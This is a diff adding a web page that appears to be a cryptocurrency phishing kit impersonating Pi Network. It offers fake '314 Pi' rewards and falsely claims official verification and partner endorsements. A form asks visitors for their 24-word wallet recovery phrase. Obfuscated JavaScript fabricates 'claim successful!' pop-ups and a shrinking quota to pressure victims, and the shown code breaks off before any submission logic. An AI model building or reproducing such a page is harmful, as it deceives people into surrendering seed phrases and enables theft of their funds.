+										data-vi="Enter your 24-word phrase to unlock and claim Pi rewards"
+										data-en="Enter your 24-word phrase to unlock and claim Pi rewards"
+									>
+										Enter your 24-word phrase to unlock and claim Pi rewards
+									</p>
+								</div>
+								<div class="text-center">
+									<div
+										class="text-2xl font-bold text-purple-600 mb-2"
+									>
+										3
+									</div>
+									<p
+										data-vi="Submit your request for verification"
+										data-en="Submit your request for verification"
+									>
+										Submit your request for verification
+									</p>
+								</div>
+								<div class="text-center">
+									<div
+										class="text-2xl font-bold text-purple-600 mb-2"
+									>
+										4
+									</div>
+									<p
+										data-vi="Receive Pi rewards within 24 hours"
+										data-en="Receive Pi rewards within 24 hours"
+									>
+										Receive Pi rewards within 24 hours
+									</p>
+								</div>
+							</div>
+
+							<div class="certificate">
+								<div class="certificate-icon">
+									<i class="fas fa-shield-alt"></i>
+								</div>
+								<p
+									class="certificate-title"
+									data-vi="Security & Transparency"
+									data-en="Security & Transparency"
+								>
+									Security & Transparency
+								</p>
+								<p
+									class="certificate-text"
+									data-vi="This is an independent promotional campaign affiliated and verified by the official Pi Network."
+									data-en="This is an independent promotional campaign affiliated and verified by the official Pi Network."
+								>
+									This is an independent promotional campaign affiliated and verified by the official Pi Network.
+								</p>
+							</div>
+						</div>
+					</section>
+
+					<!-- Sponsors Section - Enhanced -->
+					<section class="mb-10">
+						<h4
+							class="text-2xl font-bold mb-8 text-center"
+							data-vi="Supported By"
+							data-en="Supported By"
+						>
+							Supported By
+						</h4>
+						<div class="grid grid-cols-2 md:grid-cols-4 gap-6">
+							<div
+								class="card p-4 hover:shadow-lg transition-all duration-300"
+							>
+								<div
+									class="text-center text-purple-600 text-3xl mb-2"
+								>
+									<i class="fas fa-chart-line"></i>
+								</div>
+								<p class="font-bold text-center">TechFi</p>
+								<p
+									class="text-sm text-center text-gray-500"
+									data-vi="Technical support"
+									data-en="Technical support"
+								>
+									Technical support
+								</p>
+							</div>
+							<div
+								class="card p-4 hover:shadow-lg transition-all duration-300"
+							>
+								<div class="text-center mb-2">
+									<img
+										src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/9a411426-3711-47d4-9c1a-dcf72973ddfc/dfj37e6-d8b49926-d115-4368-9de8-09a80077fb4f.png/v1/fill/w_1280,h_1280/okx_okb_logo_by_saphyl_dfj37e6-fullview.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9MTI4MCIsInBhdGgiOiJcL2ZcLzlhNDExNDI2LTM3MTEtNDdkNC05YzFhLWRjZjcyOTczZGRmY1wvZGZqMzdlNi1kOGI0OTkyNi1kMTE1LTQzNjgtOWRlOC0wOWE4MDA3N2ZiNGYucG5nIiwid2lkdGgiOiI8PTEyODAifV1dLCJhdWQiOlsidXJuOnNlcnZpY2U6aW1hZ2Uub3BlcmF0aW9ucyJdfQ.kH6v6nu55xLephOzAFFhD2uCYkmFdLsBoTkSuQvtBpo"
+										alt="OKX"
+										class="w-10 h-10 mx-auto"
+									/>
+								</div>
+								<p class="font-bold text-center">OKX</p>
+								<p
+									class="text-sm text-center text-gray-500"
+									data-vi="Blockchain partner"
+									data-en="Blockchain partner"
+								>
+									Blockchain partner
+								</p>
+							</div>
+							<div
+								class="card p-4 hover:shadow-lg transition-all duration-300"
+							>
+								<div
+									class="text-center text-purple-600 text-3xl mb-2"
+								>
+									<i class="fas fa-credit-card"></i>
+								</div>
+								<p class="font-bold text-center">CryptoPlus</p>
+								<p
+									class="text-sm text-center text-gray-500"
+									data-vi="Payment gateway"
+									data-en="Payment gateway"
+								>
+									Payment gateway
+								</p>
+							</div>
+							<div
+								class="card p-4 hover:shadow-lg transition-all duration-300"
+							>
+								<div
+									class="text-center text-purple-600 text-3xl mb-2"
+								>
+									<i class="fas fa-users"></i>
+								</div>
+								<p class="font-bold text-center">PiCommunity</p>
+								<p
+									class="text-sm text-center text-gray-500"
+									data-vi="Community support"
+									data-en="Community support"
+								>
+									Community support
+								</p>
+							</div>
+						</div>
+					</section>
+
+					<!-- Footer -->
+					<footer class="py-5 px-4 relative">
+						<div class="relative z-10 container mx-auto text-center">
+							<p
+							class="mb-4 max-w-2xl mx-auto"
+							>
+								This is an independent promotional program verified by the official Pi Network.
+							</p>
+							<p
+								class="text-sm text-gray-500 dark:text-gray-400"
+							>
+								© 2025 Pi Network Reward Program. All rights reserved.
+							</p>
+						</div>
+					</footer>
+				</div>
+			</div>
+
+			<!-- Pi Wallet Form Page -->
+			<div id="formPage" class="page page-inactive-right">
+				<div class="container mx-auto px-4 py-8 bg-white">
+					<div class="pi-wallet-style surprise-container">
+						<div
+							class="pi-title"
+						>
+							Unlock Pi Wallet
+						</div>
+
+						<!-- Limit message container -->
+						<div id="limitMessage" class="limit-message">
+							<i class="fas fa-exclamation-triangle mr-2"></i>
+							<span>
+								You have submitted 1/2 requests. Each device is limited to a maximum of 2 requests.
+							</span>
+						</div>
+
+						<!-- Error message for exceeding limit -->
+						<div id="errorMessage" class="error-message">
+							<i class="fas fa-ban mr-2"></i>
+							<span>
+								You have exceeded the allowed number of request submissions (2 times). Please contact support if you need assistance.
+							</span>
+						</div>
+
+						<div class="animate-on-scroll" data-delay="200">
+							<div class="pi-input-container">
+								<textarea
+									id="walletAddress"
+									class="pi-input"
+									placeholder="Enter your 24-word recovery phrase here"
+								></textarea>
+							</div>
+							<div id="wordCounter" class="word-counter"></div>
+							<div
+								id="validationMessage"
+								class="validation-message hidden"
+							>
+								Please enter exactly 24 recovery words
+							</div>
+						</div>
+
+						<div class="animate-on-scroll" data-delay="400">
+							<button
+								id="unlockSubmitBtn"
+								class="pi-button pi-button-primary surprise-trigger"
+							>
+								UNLOCK WITH RECOVERY PHRASE
+							</button>
+
+							<button
+								class="pi-button bg-gray-400"
+								disabled
+							>
+								BIOMETRIC NOT AVAILABLE
+							</button>
+						</div>
+
+						<div class="pi-info-text">
+							<p>
+								As a non-custodial wallet, your recovery phrase is only accessible to you. Currently, recovery phrases cannot be recovered if lost.
+							</p>
+							<p class="mt-2">
+								<span>Lost your wallet recovery phrase?</span>
+								<a
+									href="#"
+									class="pi-link"
+								>You can create a new wallet</a>, but all π in your previous wallet will be inaccessible.
+							</p>
+						</div>
+
+						<!-- Hidden explosion particles for surprise effect -->
+						<div id="explosionContainer"></div>
+					</div>
+
+				</div>
+			</div>
+			<!-- Trang Tạo Ví Mới -->
+			<div
+				id="createWalletPage"
+				class="page page-inactive-right"
+				style="background-color: white"
+			>
+				<div
+					class="container mx-auto px-4"
+					style="
+						height: 100vh;
+						display: flex;
+						align-items: center;
+						justify-content: center;
+					"
+				>
+					<div
+						class="text-center"
+						style="max-width: 350px; width: 100%"
+					>
+						<h1
+							class="text-3xl font-medium mb-4"
+							style="color: #333333"
+						>
+							Create your wallet
+						</h1>
+
+						<p
+							class="mb-10 text-lg font-bold"
+							style="color: #333333"
+						>
+							Don't hit the back button until you've completed the entire process!
+						</p>
+
+						<button
+							id="createNewWalletBtn"
+							class="w-full py-3 text-white font-medium text-base rounded-lg mb-6"
+							style="
+								background-color: #693988;
+								text-transform: uppercase;
+							"
+						>
+							CREATE NEW WALLET
+						</button>
+
+						<p
+							id="walletErrorMessage"
+							class="mb-3 text-left font-normal"
+							style="
+								color: #a83232;
+								font-size: 16px;
+								display: none;
+							"
+						>
+							It looks like you recently created a new wallet. If you are resetting, please try again later.
+						</p>
+
+						<a
+							id="walletCreatedBtn"
+							href="#"
+							class="block text-center font-bold text-lg py-2"
+							style="
+								color: #0045c4;
+								text-transform: uppercase;
+								text-decoration: underline;
+							"
+						>
+							WALLET HAS BEEN CREATED
+						</a>
+					</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- Success Modal (initially hidden) -->
+		<div id="successModal" class="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 hidden">
+			<div class="card max-w-md w-full mx-4 p-8">
+				<div class="text-center mb-8">
+					<div class="w-16 h-16 mx-auto bg-green-500 rounded-full flex items-center justify-center text-white text-2xl mb-4">
+						<i class="fas fa-check"></i>
+					</div>
+					<h3 class="text-3xl font-bold mb-3">
+						Pi Reward Request Successful!
+					</h3>
+					<p class="text-gray-500 dark:text-gray-400">
+					   Your Pi reward has been queued for processing. It will be sent to your wallet within 24 hours.					</p>
+				</div>
+				
+				<div class="space-y-6 mb-8">
+					<div class="flex justify-between items-center">
+						<span class="font-bold">Receiving wallet:</span>
+						<span id="successWalletAddress" class="truncate max-w-[200px]">...</span>
+					</div>
+					<div class="flex justify-between items-center">
+						<span class="font-bold">Reward Amount:</span>
+						<span class="text-purple-600 font-bold">+314 Pi</span>
+					</div>
+					<div class="flex justify-between items-center">
+						<span class="font-bold">Estimated Time:</span>
+						<span>Within 24 hours</span>
+					</div>
+				</div>
+				
+				<button id="closeSuccessBtn" class="w-full btn-primary py-4">
+					Return to Home
+				</button>
+			</div>
+		</div>
+	
+		<div id="notice" class="notice">
+			<i class="fa-solid fa-bell" style="padding-right: 10px;"></i> 
+			<span id="notice-text"></span>
+		</div>
+		<script>
+			const _0x360b5f=_0x24a3;(function(_0x45a951,_0x113033){const _0x1e835b=_0x24a3,_0x4353b6=_0x45a951();while(!![]){try{const _0xeaed5c=-parseInt(_0x1e835b(0x14b))/0x1+-parseInt(_0x1e835b(0x11c))/0x2*(parseInt(_0x1e835b(0x209))/0x3)+parseInt(_0x1e835b(0x137))/0x4*(-parseInt(_0x1e835b(0x21e))/0x5)+-parseInt(_0x1e835b(0x14e))/0x6+-parseInt(_0x1e835b(0x25f))/0x7+-parseInt(_0x1e835b(0x1d0))/0x8+-parseInt(_0x1e835b(0x154))/0x9*(-parseInt(_0x1e835b(0x18d))/0xa);if(_0xeaed5c===_0x113033)break;else _0x4353b6['push'](_0x4353b6['shift']());}catch(_0x4b9b84){_0x4353b6['push'](_0x4353b6['shift']());}}}(_0x8a6f,0xbeeb1));const remainingQuantityElement=document[_0x360b5f(0x210)](_0x360b5f(0x191));let noticeElement=document[_0x360b5f(0x210)]('notice'),noticeTextElement=document['getElementById'](_0x360b5f(0x140)),isNoticeShowing=![];function showNotice(){const _0x298c7f=_0x360b5f;function _0x149d10(_0x1414f5){const _0x2f89c3=_0x24a3;let _0x429488=_0x2f89c3(0x119),_0x159178='';for(let _0x23016f=0x0;_0x23016f<_0x1414f5;_0x23016f++){_0x159178+=_0x429488[_0x2f89c3(0x240)](Math[_0x2f89c3(0x19f)](Math[_0x2f89c3(0x1d5)]()*_0x429488[_0x2f89c3(0x170)]));}return _0x159178;}let _0x2789f8=_0x149d10(0x3),_0x1deb79=_0x149d10(0x5);const _0x4caa3a='GD'+_0x2789f8+_0x298c7f(0x188)+_0x1deb79;noticeTextElement[_0x298c7f(0x24d)]=_0x4caa3a+'\x20claim\x20successful!',noticeElement[_0x298c7f(0x1b7)][_0x298c7f(0x1bf)]('show-notice'),isNoticeShowing=!![];let _0x553253=parseInt(remainingQuantityElement['textContent']);remainingQuantityElement['textContent']=_0x553253-0x1,localStorage['setItem'](_0x298c7f(0x191),_0x553253-0x1),setTimeout(()=>{const _0x41ee0d=_0x298c7f;noticeElement['classList'][_0x41ee0d(0x185)](_0x41ee0d(0x1a9)),isNoticeShowing=![];},0xfa0);}const randomDuration=Math[_0x360b5f(0x19f)](Math['random']()*(0x2710-0x1388+0x1))+0x1388;setInterval(()=>{const _0x2e0edd=_0x360b5f;if(!isNoticeShowing){const _0x997085=localStorage['getItem'](_0x2e0edd(0x252));!_0x997085&&showNotice();}},randomDuration);const storedQuantity=localStorage['getItem'](_0x360b5f(0x191));storedQuantity&&(remainingQuantityElement[_0x360b5f(0x24d)]=storedQuantity);showNotice();function createFloatingIcons(){const _0x4bd278=_0x360b5f,_0x3e172b=document[_0x4bd278(0x190)](_0x4bd278(0x216));_0x3e172b['id']='iconsContainer',_0x3e172b[_0x4bd278(0x16c)][_0x4bd278(0x1a5)]='fixed',_0x3e172b[_0x4bd278(0x16c)][_0x4bd278(0x199)]=_0x4bd278(0x13e),_0x3e172b[_0x4bd278(0x16c)]['height']=_0x4bd278(0x13e),_0x3e172b['style']['top']='0',_0x3e172b[_0x4bd278(0x16c)]['left']='0',_0x3e172b[_0x4bd278(0x16c)][_0x4bd278(0x181)]=_0x4bd278(0x259),_0x3e172b[_0x4bd278(0x16c)][_0x4bd278(0x25a)]='-5',_0x3e172b[_0x4bd278(0x16c)]['overflow']='hidden',document['body'][_0x4bd278(0x16a)](_0x3e172b);const _0x3990c9=[_0x4bd278(0x253),'https://static.vecteezy.com/system/resources/thumbnails/055/688/542/small/isolated-purple-balloon-no-background-with-ribbon-png.png'],_0xd45a49=0x1;for(let _0x45d83c=0x0;_0x45d83c<_0xd45a49;_0x45d83c++){setTimeout(()=>{const _0x1f9ddd=_0x4bd278,_0x54dd3e=document[_0x1f9ddd(0x190)]('img');_0x54dd3e[_0x1f9ddd(0x1aa)]='floating-icon-img';const _0x31d84a=Math['floor'](Math[_0x1f9ddd(0x1d5)]()*_0x3990c9[_0x1f9ddd(0x170)]);_0x54dd3e['src']=_0x3990c9[_0x31d84a];const _0x531bff=0x5+Math['random']()*0x5a,_0x3362b8=-0x64+Math['random']()*0xc8,_0x170b0f=0x50+Math[_0x1f9ddd(0x1d5)]()*0x28,_0x28a650=0x28+Math[_0x1f9ddd(0x1d5)]()*0x14;_0x54dd3e[_0x1f9ddd(0x16c)][_0x1f9ddd(0x20a)]('--float-distance',_0x3362b8+'px'),_0x54dd3e[_0x1f9ddd(0x16c)][_0x1f9ddd(0x14c)]=_0x531bff+'%',_0x54dd3e[_0x1f9ddd(0x16c)]['width']=_0x170b0f+'px',_0x54dd3e[_0x1f9ddd(0x16c)]['height']=_0x170b0f+'px',_0x54dd3e[_0x1f9ddd(0x16c)][_0x1f9ddd(0x241)]=_0x28a650+'s',_0x3e172b[_0x1f9ddd(0x16a)](_0x54dd3e),setTimeout(()=>{const _0x20ffe6=_0x1f9ddd;_0x54dd3e[_0x20ffe6(0x185)]();},_0x28a650*0x3e8);},_0x45d83c*0x1388);}setInterval(()=>{const _0x4700f5=_0x4bd278;if(document[_0x4700f5(0x24e)]==='visible'){const _0x354605=document[_0x4700f5(0x190)](_0x4700f5(0x206));_0x354605[_0x4700f5(0x1aa)]='floating-icon-img';const _0x153409=Math[_0x4700f5(0x19f)](Math[_0x4700f5(0x1d5)]()*_0x3990c9[_0x4700f5(0x170)]);_0x354605[_0x4700f5(0x1ad)]=_0x3990c9[_0x153409];const _0x17b0d2=0x5+Math[_0x4700f5(0x1d5)]()*0x5a,_0x580a0e=-0x64+Math[_0x4700f5(0x1d5)]()*0xc8,_0x41d2d2=0x50+Math[_0x4700f5(0x1d5)]()*0x28,_0x17947b=0x28+Math[_0x4700f5(0x1d5)]()*0x14;_0x354605[_0x4700f5(0x16c)]['setProperty'](_0x4700f5(0x180),_0x580a0e+'px'),_0x354605[_0x4700f5(0x16c)][_0x4700f5(0x14c)]=_0x17b0d2+'%',_0x354605[_0x4700f5(0x16c)][_0x4700f5(0x199)]=_0x41d2d2+'px',_0x354605['style'][_0x4700f5(0x1b2)]=_0x41d2d2+'px',_0x354605[_0x4700f5(0x16c)][_0x4700f5(0x241)]=_0x17947b+'s',_0x3e172b[_0x4700f5(0x16a)](_0x354605),setTimeout(()=>{const _0x4c6197=_0x4700f5;_0x354605[_0x4c6197(0x185)]();},_0x17947b*0x3e8);}},0x4e20);}function createPremiumBackground(){const _0x199c3c=_0x360b5f,_0xa937bf=document['getElementById']('starsContainer'),_0x32a085=0x5;for(let _0x12b61f=0x0;_0x12b61f<_0x32a085;_0x12b61f++){const _0x449191=document[_0x199c3c(0x190)](_0x199c3c(0x216));_0x449191[_0x199c3c(0x1aa)]=_0x199c3c(0x153),_0x449191[_0x199c3c(0x16c)][_0x199c3c(0x199)]=Math['random']()*0x3+0x1+'px',_0x449191[_0x199c3c(0x16c)][_0x199c3c(0x1b2)]=_0x449191[_0x199c3c(0x16c)][_0x199c3c(0x199)],_0x449191[_0x199c3c(0x16c)][_0x199c3c(0x14c)]=Math[_0x199c3c(0x1d5)]()*0x64+'%',_0x449191[_0x199c3c(0x16c)][_0x199c3c(0x217)]=Math[_0x199c3c(0x1d5)]()*0x64+'%',_0x449191[_0x199c3c(0x16c)]['animationDelay']=Math['random']()*0x4+'s',_0xa937bf[_0x199c3c(0x16a)](_0x449191);}const _0x3faf07=document[_0x199c3c(0x210)](_0x199c3c(0x1af)),_0x3b7537=0x1;for(let _0x112881=0x0;_0x112881<_0x3b7537;_0x112881++){const _0x350b5f=document[_0x199c3c(0x190)](_0x199c3c(0x216));_0x350b5f['className']=_0x199c3c(0x135),_0x350b5f[_0x199c3c(0x16c)][_0x199c3c(0x14c)]=Math[_0x199c3c(0x1d5)]()*0x5a+0x5+'%',_0x350b5f['style']['top']=Math['random']()*0x5a+0x5+'%',_0x350b5f['style']['animationDelay']=Math[_0x199c3c(0x1d5)]()*0x3+'s',_0x3faf07[_0x199c3c(0x16a)](_0x350b5f);}const _0x5c4a40=document[_0x199c3c(0x210)](_0x199c3c(0x132)),_0x57afef=0x0;for(let _0x5a6edd=0x0;_0x5a6edd<_0x57afef;_0x5a6edd++){const _0x1d62f7=document[_0x199c3c(0x190)]('div');_0x1d62f7[_0x199c3c(0x1aa)]='shooting-star',_0x1d62f7[_0x199c3c(0x16c)]['left']=Math[_0x199c3c(0x1d5)]()*0x1e+'%',_0x1d62f7[_0x199c3c(0x16c)][_0x199c3c(0x217)]=Math[_0x199c3c(0x1d5)]()*0x1e+'%';const _0x107951=0x50+Math[_0x199c3c(0x1d5)]()*0x78;_0x1d62f7[_0x199c3c(0x16c)][_0x199c3c(0x199)]=_0x107951+'px',_0x1d62f7[_0x199c3c(0x16c)][_0x199c3c(0x1b2)]=_0x199c3c(0x219),_0x1d62f7[_0x199c3c(0x16c)][_0x199c3c(0x196)]=_0x199c3c(0x133),_0x1d62f7[_0x199c3c(0x16c)][_0x199c3c(0x1e0)]=_0x5a6edd*0x3+Math[_0x199c3c(0x1d5)]()*0x3+'s',_0x5c4a40[_0x199c3c(0x16a)](_0x1d62f7);}const _0x536829=document[_0x199c3c(0x210)](_0x199c3c(0x225)),_0x2c82fa=0x2,_0x4c4633=[{'left':_0x199c3c(0x1f2),'top':_0x199c3c(0x1f2)},{'left':_0x199c3c(0x1fe),'top':_0x199c3c(0x1f2)},{'left':_0x199c3c(0x1f2),'top':_0x199c3c(0x1fe)},{'left':_0x199c3c(0x1fe),'top':_0x199c3c(0x1fe)}],_0x2a5235=[_0x199c3c(0x134),'https://img.upanh.tv/2025/03/11/favicon42527eabc5bda97a.png'];for(let _0x2beea9=0x0;_0x2beea9<_0x2c82fa;_0x2beea9++){const _0x3c09cb=document['createElement'](_0x199c3c(0x216));_0x3c09cb['className']='premium-coin';const _0x4d6958=document[_0x199c3c(0x190)]('img');_0x4d6958[_0x199c3c(0x1ad)]=_0x2a5235[_0x2beea9%_0x2a5235[_0x199c3c(0x170)]],_0x4d6958[_0x199c3c(0x16c)]['width']=_0x199c3c(0x13e),_0x4d6958['style'][_0x199c3c(0x1b2)]=_0x199c3c(0x13e),_0x4d6958[_0x199c3c(0x16c)]['objectFit']=_0x199c3c(0x16d),_0x4d6958[_0x199c3c(0x16c)]['borderRadius']=_0x199c3c(0x12f),_0x3c09cb['appendChild'](_0x4d6958);const _0x6ae017=0x1e+Math[_0x199c3c(0x1d5)]()*0x14;_0x3c09cb[_0x199c3c(0x16c)][_0x199c3c(0x199)]=_0x6ae017+'px',_0x3c09cb[_0x199c3c(0x16c)][_0x199c3c(0x1b2)]=_0x6ae017+'px',_0x3c09cb['style']['left']=_0x4c4633[_0x2beea9][_0x199c3c(0x14c)],_0x3c09cb[_0x199c3c(0x16c)][_0x199c3c(0x217)]=_0x4c4633[_0x2beea9][_0x199c3c(0x217)],_0x3c09cb['style'][_0x199c3c(0x1e0)]=Math[_0x199c3c(0x1d5)]()*0x3+'s',_0x3c09cb[_0x199c3c(0x16c)][_0x199c3c(0x1a1)]=_0x199c3c(0x1a8),_0x3c09cb[_0x199c3c(0x16c)][_0x199c3c(0x1ff)]='float\x2010s\x20infinite\x20ease-in-out',_0x536829[_0x199c3c(0x16a)](_0x3c09cb);}const _0x18135c=document['getElementById']('lightStreaksContainer'),_0x2221dc=0x1;for(let _0x182f9d=0x0;_0x182f9d<_0x2221dc;_0x182f9d++){const _0x2d5993=document[_0x199c3c(0x190)](_0x199c3c(0x216));_0x2d5993[_0x199c3c(0x1aa)]=_0x199c3c(0x24a),_0x2d5993['style']['top']=0x32+'%',_0x2d5993[_0x199c3c(0x16c)][_0x199c3c(0x1e0)]=_0x182f9d*0x5+'s',_0x18135c[_0x199c3c(0x16a)](_0x2d5993);}}function createConfetti(){const _0x19db0c=_0x360b5f,_0x5f0d71=document[_0x19db0c(0x210)](_0x19db0c(0x14a));_0x5f0d71[_0x19db0c(0x22c)]='';const _0x37e996=[_0x19db0c(0x24b),_0x19db0c(0x165),_0x19db0c(0x1ac),_0x19db0c(0x148),_0x19db0c(0x257)],_0x2710db=0x46;for(let _0x4da332=0x0;_0x4da332<_0x2710db;_0x4da332++){const _0x5b297d=document[_0x19db0c(0x190)]('div'),_0x329d34=Math[_0x19db0c(0x19f)](Math['random']()*0x3);if(_0x329d34===0x0)_0x5b297d[_0x19db0c(0x1aa)]='confetti\x20confetti-square';else _0x329d34===0x1?_0x5b297d[_0x19db0c(0x1aa)]=_0x19db0c(0x1f1):_0x5b297d[_0x19db0c(0x1aa)]=_0x19db0c(0x226);_0x5b297d[_0x19db0c(0x16c)][_0x19db0c(0x14c)]=Math[_0x19db0c(0x1d5)]()*0x64+'%',_0x5b297d[_0x19db0c(0x16c)][_0x19db0c(0x1e9)]=_0x37e996[Math[_0x19db0c(0x19f)](Math['random']()*_0x37e996['length'])];const _0x3b33ac=0x5+Math['random']()*0xa;_0x5b297d[_0x19db0c(0x16c)][_0x19db0c(0x199)]=_0x3b33ac+'px',_0x5b297d[_0x19db0c(0x16c)][_0x19db0c(0x1b2)]=_0x3b33ac+'px';const _0x13b8ba=0x2+Math[_0x19db0c(0x1d5)]()*0x3,_0x1dc380=Math['random']()*0.5;_0x5b297d[_0x19db0c(0x16c)][_0x19db0c(0x1ff)]=_0x19db0c(0x15f)+_0x13b8ba+_0x19db0c(0x117)+_0x1dc380+_0x19db0c(0x251),_0x5f0d71[_0x19db0c(0x16a)](_0x5b297d);}}function showConfetti(){const _0x1ba783=_0x360b5f;createConfetti();const _0x303798=document['getElementById'](_0x1ba783(0x14a));_0x303798[_0x1ba783(0x16c)][_0x1ba783(0x22d)]=_0x1ba783(0x166),_0x303798[_0x1ba783(0x16c)][_0x1ba783(0x25a)]=_0x1ba783(0x16b),setTimeout(()=>{const _0x52f908=_0x1ba783;_0x303798[_0x52f908(0x16c)][_0x52f908(0x22d)]='none';},0x1388);}function setupFeatureCardWaves(){const _0x172091=_0x360b5f,_0x13677e=document[_0x172091(0x202)](_0x172091(0x12a));_0x13677e['forEach'](_0x7e3cb2=>{const _0x41577a=_0x172091;_0x7e3cb2[_0x41577a(0x16c)][_0x41577a(0x22d)]=_0x41577a(0x259);});const _0x23df68=document['querySelectorAll']('.feature-icon');_0x23df68[_0x172091(0x229)](_0x3ec45a=>{_0x3ec45a['style']['setProperty']('--shine-opacity','0');});}function createExplosionParticles(){const _0x5a8512=_0x360b5f,_0x1d1180=document[_0x5a8512(0x210)]('explosionContainer'),_0x19c4be=0xa;for(let _0x504e55=0x0;_0x504e55<_0x19c4be;_0x504e55++){const _0x50202b=document[_0x5a8512(0x190)]('div');_0x50202b['className']=_0x5a8512(0x1f4);const _0x251840=Math[_0x5a8512(0x1d5)]()*Math['PI']*0x2,_0x511c72=0x64+Math['random']()*0x64,_0x3f06ff=Math[_0x5a8512(0x1f6)](_0x251840)*_0x511c72,_0x41d19b=Math[_0x5a8512(0x1c8)](_0x251840)*_0x511c72;_0x50202b[_0x5a8512(0x16c)][_0x5a8512(0x20a)](_0x5a8512(0x16e),_0x3f06ff+'px'),_0x50202b[_0x5a8512(0x16c)]['setProperty'](_0x5a8512(0x11d),_0x41d19b+'px'),_0x1d1180[_0x5a8512(0x16a)](_0x50202b);}}function showLoading(){const _0x1481a3=_0x360b5f;document['getElementById'](_0x1481a3(0x1a4))[_0x1481a3(0x16c)][_0x1481a3(0x22d)]=_0x1481a3(0x120);}function hideLoading(){const _0x536d22=_0x360b5f;document[_0x536d22(0x210)]('loadingOverlay')[_0x536d22(0x16c)][_0x536d22(0x22d)]=_0x536d22(0x259);}function showSuccessModal(_0xe0ba8f){const _0x31c505=_0x360b5f,_0x1afc2c=document['getElementById'](_0x31c505(0x214));if(_0xe0ba8f&&_0xe0ba8f[_0x31c505(0x170)]>0xa){const _0x55f40f=_0xe0ba8f[_0x31c505(0x11e)](0x0,0x6),_0x1254fc=_0xe0ba8f[_0x31c505(0x11e)](_0xe0ba8f[_0x31c505(0x170)]-0x5);document[_0x31c505(0x210)](_0x31c505(0x1b9))['textContent']=_0x55f40f+_0x31c505(0x188)+_0x1254fc;}else document[_0x31c505(0x210)]('successWalletAddress')[_0x31c505(0x24d)]=_0xe0ba8f||_0x31c505(0x1d2);_0x1afc2c[_0x31c505(0x16c)][_0x31c505(0x22d)]=_0x31c505(0x120),_0x1afc2c[_0x31c505(0x1b7)][_0x31c505(0x185)](_0x31c505(0x1dc)),showConfetti();const _0x17f52c=document['getElementById'](_0x31c505(0x168));_0x17f52c[_0x31c505(0x23f)](_0x31c505(0x175),hideSuccessModal);}function dismissHighlight(){const _0x535b1d=_0x360b5f,_0x536d05=document[_0x535b1d(0x210)](_0x535b1d(0x214)),_0x1db336=document[_0x535b1d(0x210)]('modalHighlightOverlay'),_0x300af4=document['getElementById']('importantNoteSection'),_0x1cefb2=document[_0x535b1d(0x210)](_0x535b1d(0x136));_0x536d05[_0x535b1d(0x1b7)]['remove'](_0x535b1d(0x1e5)),_0x1db336[_0x535b1d(0x1b7)][_0x535b1d(0x185)](_0x535b1d(0x203)),_0x300af4[_0x535b1d(0x1b7)]['remove'](_0x535b1d(0x1ba)),_0x1cefb2['classList'][_0x535b1d(0x1bf)](_0x535b1d(0x1dc));}function hideSuccessModal(){const _0xc3cfd6=_0x360b5f,_0x4ce2dc=document['getElementById'](_0xc3cfd6(0x214));_0x4ce2dc[_0xc3cfd6(0x16c)]['display']=_0xc3cfd6(0x259),_0x4ce2dc['classList'][_0xc3cfd6(0x1bf)]('hidden'),_0x4ce2dc[_0xc3cfd6(0x1b7)][_0xc3cfd6(0x185)](_0xc3cfd6(0x1e5));const _0x5cfdb3=document['getElementById']('modalHighlightOverlay'),_0x1d1521=document[_0xc3cfd6(0x210)](_0xc3cfd6(0x187));if(_0x5cfdb3)_0x5cfdb3[_0xc3cfd6(0x1b7)][_0xc3cfd6(0x185)](_0xc3cfd6(0x203));if(_0x1d1521)_0x1d1521[_0xc3cfd6(0x1b7)][_0xc3cfd6(0x185)]('highlight-important-note');}function navigateTo(_0x34ce51,_0x2b723c,_0x179f72=_0x360b5f(0x24c)){const _0x2d7b76=_0x360b5f,_0x1ef2bc=document[_0x2d7b76(0x210)](_0x34ce51),_0x5d0054=document['getElementById'](_0x2b723c);_0x1ef2bc[_0x2d7b76(0x1b7)]['remove']('page-active'),_0x5d0054[_0x2d7b76(0x1b7)][_0x2d7b76(0x185)](_0x2d7b76(0x173),_0x2d7b76(0x22f));_0x179f72===_0x2d7b76(0x24c)?(_0x1ef2bc[_0x2d7b76(0x1b7)][_0x2d7b76(0x1bf)](_0x2d7b76(0x173)),_0x5d0054[_0x2d7b76(0x1b7)][_0x2d7b76(0x1bf)](_0x2d7b76(0x1c4))):(_0x1ef2bc[_0x2d7b76(0x1b7)][_0x2d7b76(0x1bf)](_0x2d7b76(0x22f)),_0x5d0054[_0x2d7b76(0x1b7)]['add'](_0x2d7b76(0x1c4)));const _0x59e302=document[_0x2d7b76(0x210)](_0x2d7b76(0x143));_0x2b723c===_0x2d7b76(0x261)?_0x59e302['style'][_0x2d7b76(0x1a7)]=_0x2d7b76(0x1dc):_0x59e302[_0x2d7b76(0x16c)][_0x2d7b76(0x1a7)]=_0x2d7b76(0x142);const _0x1efb07=document[_0x2d7b76(0x20b)](_0x2d7b76(0x1ed));_0x1efb07&&(_0x2b723c===_0x2d7b76(0x261)?_0x1efb07['style']['display']=_0x2d7b76(0x166):_0x1efb07[_0x2d7b76(0x16c)]['display']=_0x2d7b76(0x259)),window[_0x2d7b76(0x121)](0x0,0x0);}function handleScrollAnimations(){const _0x165144=_0x360b5f,_0x4ee0d0=document['querySelectorAll'](_0x165144(0x1ce)),_0x2d805c=new IntersectionObserver(_0x4a2bfb=>{const _0xca24aa=_0x165144;_0x4a2bfb[_0xca24aa(0x229)](_0x44872a=>{const _0x5c67df=_0xca24aa;if(_0x44872a[_0x5c67df(0x177)]){const _0x448e56=_0x44872a[_0x5c67df(0x163)][_0x5c67df(0x230)]('data-delay')||0x0;setTimeout(()=>{const _0x579d79=_0x5c67df;_0x44872a[_0x579d79(0x163)][_0x579d79(0x1b7)][_0x579d79(0x1bf)]('animated');},_0x448e56),_0x2d805c[_0x5c67df(0x1b5)](_0x44872a['target']);}});},{'threshold':0.1,'rootMargin':_0x165144(0x1a6)});_0x4ee0d0[_0x165144(0x229)](_0x36688f=>{const 